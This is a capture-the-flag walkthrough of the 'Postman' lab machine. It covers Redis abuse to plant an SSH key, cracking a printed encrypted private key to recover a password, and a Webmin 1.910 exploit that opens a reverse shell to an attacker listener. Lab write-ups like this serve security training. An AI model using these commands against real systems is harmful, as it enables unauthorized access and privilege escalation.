# 📩 Post Man

## Enumeration

```
rustscan -a 10.129.2.1 --ulimit 5000 -- -A
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*CEGN7l1Ad5M4ABEl_HTSEw.png" alt="" height="460" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*XB76BZM7QKEg0aBKz_kMVg.png" alt="" height="364" width="700"><figcaption></figcaption></figure>

Running ffuf on port 80:

```
ffuf -w '/usr/share/wordlists/dirb/common.txt' -u ' -t 64
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*waPjvAvaOLgPNxdF1k-fiw.png" alt="" height="237" width="700"><figcaption></figcaption></figure>

Let’s visit the websites:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*a-TX2oFzTNo-uIq12Etnrg.png" alt="" height="321" width="700"><figcaption></figcaption></figure>

And:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*jK-ymxRIYsU2Ts4A-c3S6Q.png" alt="" height="337" width="700"><figcaption></figcaption></figure>

## Redis

We also saw that redis is running, let’s connect to that:

```
redis-cli -h postman.htb
```

[6379 - Pentesting RedisIf only password is configured the username used is " default ". Also, note that there is if Redis was configured with…book.hacktricks.x](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis?source=post\_page-----5d31df5bf6d9--------------------------------)[yz](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis?source=post\_page-----5d31df5bf6d9--------------------------------)

First create a SSH key on your machine:

```
ssh-keygen -t rsa
```

Then:

```
(echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > foo.txt
cat foo.txt | redis-cli -h postman.htb -x set crackit
chmod 600 id_rsa
```

Then connect to redis and then run these:

```
config get dir
```

We see that we are in the /var/lib/redis directory. So, run:

```
config set dir /var/lib/redis/.sshconfig 
set dbfilename "authorized_keys"
save
```

Then let’s try to SSH into user **redis** with our id\_rsa:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*LcQxn-ANsFtkUX82Cir0Qg.png" alt="" height="351" width="700"><figcaption></figcaption></figure>

And we are in!\
In the /opt directory, we find a **id\_rsa.bak**:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287CJehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
```

Let’s crack it using john:

```
/usr/share/john/ssh2john.py id_rsa2 > hash.txtjohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

And we get the password as: **computer2008**

Let’s see if we can SSH into Matt:

<figure><img src="https://miro.medium.com/v2/resize:fit:507/1*LhQv3mltoXE7xR6EJVnvGQ.png" alt="" height="127" width="507"><figcaption></figcaption></figure>

:/\
Let’s see if this is also the password for Matt:

```
su Matt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:262/1*4l5gjWcgw_r8dymqLRnK6g.png" alt="" height="96" width="262"><figcaption></figcaption></figure>

And we are Matt!\
Get **user.txt** from **/home/Matt/user.txt**

## **Priv ESC**

Now, time for privilege escalation. I found that **root** is running Webmin from [pspy](https://github.com/DominicBreuker/pspy). The **version** file in /etc/webmin revealed a version: **1.910**. I searched for exploits and found this:

[GitHub - roughiz/Webmin-1.910-Exploit-Script: Webmin 1.910 - Remote Code Execution Using Python…Webmin 1.910 - Remote Code Execution Using Python Script - GitHub - roughiz/Webmin-1.910-Exploit-Script: Webmin 1.910 …github.com](https://github.com/roughiz/Webmin-1.910-Exploit-Script?source=post\_page-----5d31df5bf6d9--------------------------------)

We need login creds for this. I tried to login in the webmin login page with Matt’s creds and it worked! So, we can use the exploit now. I ran this while a nc listener was set-up:

```
python2 exploit.py --rhost postman.htb --rport 10000 -u Matt -p computer2008 --lhost 10.10.14.88 --lport 1234 -s true
```

<figure><img src="https://miro.medium.com/v2/resize:fit:520/1*k8QvA1sYP1ZfuZjy7Ygp3A.png" alt="" height="171" width="520"><figcaption></figcaption></figure>

And we are **root**!\
Get **root.txt** from **/root/root.txt**
